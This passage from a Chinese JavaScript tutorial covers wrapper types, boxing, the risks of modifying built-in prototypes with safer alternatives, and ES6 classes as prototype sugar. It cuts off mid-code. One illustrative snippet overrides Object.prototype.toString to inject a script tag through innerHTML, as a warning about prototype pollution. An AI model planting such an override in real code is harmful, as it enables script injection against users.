class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>)      <span class="hljs-comment">// 128522</span><br></code></pre></td></tr></table></figure><p><strong>Number 包装类型</strong></p><p>原型链结构如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[Number实例]<br>→ Number.prototype<br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p>Number.prototype 核心方法:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 转换方法</span><br>(<span class="hljs-number">123.456</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)    <span class="hljs-comment">// &#x27;123.46&#x27;</span><br>(<span class="hljs-number">255</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>)      <span class="hljs-comment">// &#x27;ff&#x27;</span><br><br><span class="hljs-comment">// ES6+ 新增方法</span><br><span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isInteger</span>(<span class="hljs-number">5.0</span>)   <span class="hljs-comment">// true</span><br>(<span class="hljs-number">1000</span>).<span class="hljs-title function_">toExponential</span>()  <span class="hljs-comment">// &#x27;1e+3&#x27;</span><br><br><span class="hljs-comment">// 数值格式化</span><br>(<span class="hljs-number">123456.789</span>).<span class="hljs-title function_">toLocaleString</span>(<span class="hljs-string">&#x27;de-DE&#x27;</span>) <span class="hljs-comment">// &#x27;123.456,789&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Boolean 包装类型</strong></p><p>原型链结构：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[Boolean实例]<br>→ Boolean.prototype<br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p>Boolean.prototype 方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 基本方法</span><br><span class="hljs-literal">true</span>.<span class="hljs-title function_">toString</span>()         <span class="hljs-comment">// &#x27;true&#x27;</span><br><span class="hljs-literal">false</span>.<span class="hljs-title function_">valueOf</span>()         <span class="hljs-comment">// false</span><br><br><span class="hljs-comment">// 注意：Boolean包装对象的方法较少</span><br></code></pre></td></tr></table></figure><p><strong>自动装箱与拆箱机制</strong></p><p>（1）自动装箱</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 原始值访问属性时自动创建包装对象</span><br><span class="hljs-keyword">const</span> str = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-property">length</span>); <span class="hljs-comment">// 5 (临时创建String对象)</span><br><br><span class="hljs-comment">// 等价于</span><br><span class="hljs-keyword">const</span> temp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(str);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(temp.<span class="hljs-property">length</span>);<br>temp = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 使用后立即销毁</span><br></code></pre></td></tr></table></figure><p>（2）手动装箱与拆箱</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 手动创建包装对象</span><br><span class="hljs-keyword">const</span> strObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>);<br><span class="hljs-keyword">const</span> numObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">const</span> boolObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// 拆箱操作</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-title function_">valueOf</span>()); <span class="hljs-comment">// &#x27;hello&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj + <span class="hljs-number">1</span>);      <span class="hljs-comment">// 124 (自动调用valueOf)</span><br></code></pre></td></tr></table></figure><p><strong>原始值与包装对象的区别</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&#x27;hello&#x27;</span>           <span class="hljs-comment">// &#x27;string&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) <span class="hljs-comment">// &#x27;object&#x27;</span><br><br><span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>   <span class="hljs-comment">// false</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span> <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>valueOf() 的重要性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> numObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">42</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj === <span class="hljs-number">42</span>);       <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj.<span class="hljs-title function_">valueOf</span>() === <span class="hljs-number">42</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="8-4-修改内置原型的风险与最佳实践"><a href="#8-4-修改内置原型的风险与最佳实践" class="headerlink" title="8.4 修改内置原型的风险与最佳实践"></a>8.4 修改内置原型的风险与最佳实践</h2><p><strong>主要风险</strong></p><p>（1）全局污染</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 默认添加的属性是可枚举的</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">customMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 会输出 &quot;customMethod&quot; (污染for-in循环)</span><br>&#125;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// 包含自定义方法</span><br></code></pre></td></tr></table></figure><p>（2）命名冲突和覆盖风险</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不同库可能修改同一原型</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">find</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* A库的实现 */</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">find</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* B库的实现 */</span> &#125;; <span class="hljs-comment">// 后者覆盖前者</span><br><br><span class="hljs-comment">// 未来ECMAScript标准可能引入同名方法</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">includes</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* 自定义实现 */</span> &#125;;<br><span class="hljs-comment">// 当ES2016引入标准includes方法时产生冲突</span><br></code></pre></td></tr></table></figure><p>（3）性能影响</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 修改原型会破坏引擎优化</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">newMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-comment">// V8引擎的隐藏类机制受影响</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-title function_">newMethod</span>(); <span class="hljs-comment">// 触发隐藏类转换，降低性能</span><br></code></pre></td></tr></table></figure><p>（4）安全漏洞</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 污染toString方法</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;maliciousCode()&lt;/script&gt;&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// 当系统调用toString时</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = someObject.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// 执行恶意代码</span><br></code></pre></td></tr></table></figure><p>（5）预期外行为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 修改基础对象原型会影响所有对象</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isEmpty</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">length</span> === <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">// 意外影响第三方代码</span><br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>set.<span class="hljs-title function_">isEmpty</span>(); <span class="hljs-comment">// 抛出TypeError（Set没有keys方法）</span><br></code></pre></td></tr></table></figure><p><strong>最佳实践</strong></p><p>（1）安全扩展模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用Object.defineProperty控制属性特性</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">&#x27;safeMethod&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* 实现 */</span> &#125;,<br>  <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// 允许后续修改</span><br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,   <span class="hljs-comment">// 不会出现在for-in循环</span><br>  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>   <span class="hljs-comment">// 允许后续删除</span><br>&#125;);<br><br><span class="hljs-comment">// 检查方法是否已存在</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">safeMethod</span>) &#123;<br>  <span class="hljs-comment">// 安全添加</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）使用 Symbol 作为键</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建唯一Symbol键</span><br><span class="hljs-keyword">const</span> arrayUniqueMethod = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;arrayUniqueMethod&#x27;</span>);<br><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[arrayUniqueMethod] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-variable language_">this</span>)];<br>&#125;;<br><br>[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>][arrayUniqueMethod](); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p>（3）模块化扩展模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不修改原型，提供工具函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ArrayUtils</span> = &#123;<br>  <span class="hljs-attr">unique</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) &#123;<br>    <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(arr)];<br>  &#125;,<br>  <span class="hljs-attr">shuffle</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>&#125;;<br><br><span class="hljs-comment">// 使用方式</span><br><span class="hljs-title class_">ArrayUtils</span>.<span class="hljs-title function_">unique</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]);<br></code></pre></td></tr></table></figure><p>（4）子类化替代方案</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-title function_">unique</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-variable language_">this</span>)];<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeArray</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>arr.<span class="hljs-title function_">unique</span>(); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p>（5）使用 Proxy 封装</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createEnhancedArray</span>(<span class="hljs-params">arr</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(arr, &#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>      <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">&#x27;unique&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(target)];<br>      &#125;<br>      <span class="hljs-keyword">return</span> target[prop];<br>    &#125;<br>  &#125;);<br>&#125;<br><br><span class="hljs-keyword">const</span> arr = <span class="hljs-title function_">createEnhancedArray</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]);<br>arr.<span class="hljs-title function_">unique</span>(); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p><strong>决策流程</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">是否需要修改内置原型？<br>├─ 是 → <br>│  ├─ 是否为标准Polyfill？ → 使用Object.defineProperty规范实现<br>│  ├─ 是否为项目特有需求？ → 考虑子类化或工具函数<br>│  └─ 是否影响第三方代码？ → 全面测试兼容性<br>└─ 否 → <br>   ├─ 使用工具函数/模块<br>   ├─ 使用现代语法特性<br>   └─ 考虑函数组合模式<br></code></pre></td></tr></table></figure><p><strong>总结建议</strong></p><ol><li>基本原则：永远不要修改 Object.prototype；避免修改其他内置原型，除非绝对必要；</li><li>必须修改时要有安全措施</li><li>长期维护考量：记录所有内置原型修改；为自定义方法&#x2F;属性添加前缀（比如<code>_myLibUnique</code>）；定期检查与最新 ECMAScript 标准的兼容性</li><li>团队协作规范：代码 review 中严格检查原型修改；使用 ESLint 规则限制；项目文档中明确记录扩展方法</li></ol><h1 id="第九章：现代-JavaScript-中的原型"><a href="#第九章：现代-JavaScript-中的原型" class="headerlink" title="第九章：现代 JavaScript 中的原型"></a>第九章：现代 JavaScript 中的原型</h1><h2 id="9-1-ES6-class-语法糖的本质"><a href="#9-1-ES6-class-语法糖的本质" class="headerlink" title="9.1 ES6 class 语法糖的本质"></a>9.1 ES6 <code>class</code> 语法糖的本质</h2><p>class 语法并非 ES6 全新引入的面向对象的继承模型，而是 JavaScript 现有的原型继承的语法糖</p><p><strong>结构对比</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ES5构造函数写法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// ES6 class 写法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>Babel 转译后的代码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-meta">&quot;use strict&quot;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-params">instance, Constructor</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Constructor</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&quot;Cannot call a class as a function&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-params">target, props</span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; props.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">var</span> descriptor = props[i];<br>    descriptor.<span class="hljs-property">enumerable</span> = descriptor.<span class="hljs-property">enumerable</span> || <span class="hljs-literal">false</span>;<br>    descriptor.<span class="hljs-property">configurable</span> = <span class="hljs-literal">true</span>;<br>    descriptor.<span class="hljs-property">writable</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, descriptor.<span class="hljs-property">key</span>, descriptor);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_createClass</span>(<span class="hljs-params">Constructor, protoProps, staticProps</span>) &#123;<br>  <span class="hljs-keyword">if</span> (protoProps) <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, protoProps);<br>  <span class="hljs-keyword">if</span> (staticProps) <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-title class_">Constructor</span>, staticProps);<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Constructor</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Person</span> = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title class_">Person</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">_createClass</span>(<span class="hljs-title class_">Person</span>, [&#123;<br>    <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;sayHello&quot;</span>,<br>    <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, &quot;</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>));<br>    &#125;<br>  &#125;]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Person</span>;<br>&#125;();<br></code></pre></td></tr></table></figure><p><strong>核心特性解析</strong></p><p>（1）构造函数对应关系</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;baz&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 等价于</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;baz&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）方法定义本质</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-comment">// 等价于</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br></code></pre></td></tr></table></figure><p>（3）静态成员实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-comment">// 等价于</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property">staticMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br></code></pre></td></tr></table></figure><p>（4）继承机制原理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 